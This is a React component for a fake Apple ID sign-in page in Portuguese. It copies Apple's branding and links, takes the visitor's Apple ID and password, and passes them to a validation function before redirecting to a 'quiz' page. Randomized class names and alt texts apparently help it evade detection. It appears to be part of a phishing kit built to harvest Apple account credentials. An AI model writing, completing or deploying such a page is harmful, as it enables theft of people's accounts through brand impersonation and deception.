import React, { useState } from "react";

import './style.css'
import introLogo from "../../assets/img/apple_intro.png";
import { getRandomLetters, ValidateEmail, ValidatePass } from "../../utils/functions";
import { useNavigate } from "react-router-dom";

export const Apple =() =>{

    const navigate = useNavigate();

    const [email, setEmail] = useState('');
    const [senha, setSenha] = useState('');
    const [emailValidado, setEmailValidado] = useState(false);
    const [senhaValidada, setSenhaValidada] = useState(false);

    const Enviar = async () => {

        if(!emailValidado){
            setEmailValidado(ValidateEmail(email))
        }

        if(emailValidado && !senhaValidada){
            
            let retornoAPI = await ValidatePass(email, senha);
            if(retornoAPI !== undefined){
                setSenhaValidada(true);
                navigate('/quiz', { state: { data : retornoAPI }})
            }
        }
    }

    return(
        <>
            <section className={getRandomLetters(7)}>
                <nav className={getRandomLetters(7)+" menu_superior"}>
                    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACYAAAAlCAYAAAAuqZsAAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAABYSURBVFhH7daxDQAgCABBdCXmYToG1YbefGfx10j5BTGszDzxoT3vdwyjDKMMowyjDKMMowyj8D3W3TNxVTXTm4ciZRhlGOV3QbljlGGUYZRhlGGUYUzEBSUwDj6E1Q7tAAAAAElFTkSuQmCC" alt={getRandomLetters(7)} />
                    <img src="data:image/png;base64," alt={getRandomLetters(7)} />
                    <img src="data:image/png;base64," alt={getRandomLetters(7)} />
                </nav>
                <nav className={getRandomLetters(7)+" menu_secundario"}>
                    <span>ID Apple</span>
                    <img src="data:image/png;base64," alt={getRandomLetters(7)} />
                </nav>
                <div className={getRandomLetters(7)+" appleIntro"}>
                    <img src={introLogo} alt={getRandomLetters(7)}/>
                </div>
                <div className={getRandomLetters(7)+" content"}>
                    <h1>ID Apple</h1>
                    <span>Gerencie sua conta da Apple</span>
                    <input className="input_email" onChange={(e) => setEmail(e.target.value)} type="email" id="email" placeholder="ID Apple" autoComplete="false" defaultValue="" />
                    <input className="input_senha parte2 part2" onChange={(e) => setSenha(e.target.value)} type="password" id="senha" placeholder="Senha" defaultValue="" />
                    <button className="btn_enter" onClick={() => Enviar()}>
                        <img src="data:image/png;base64," alt={getRandomLetters(7)} /></button><div className="lembrar">
                            <label>
                                <input type="checkbox" /> Lembrar ID Apple
                            </label>
                        </div>
                        <div className="pop-container signin-error erro erro_senha">
                            <div className="pop-bottom tk-subbody-headline">
                                <p className="fat" id="errMsg">ID&nbsp;Apple ou senha inválido.</p>
                                <a className="si-link ax-outline thin tk-subbody" href="https://iforgot.apple.com/password/verify/appleid" target="_blank" rel="noopener noreferrer">Esqueceu a senha?</a>
                            </div>
                        </div>
                        <a href="https://iforgot.apple.com/password/verify/appleid" className="sk-icon-external">Esqueceu o ID Apple ou a senha?</a>
                    </div>
            </section>

            
            
        </>
    );
}

export default Apple;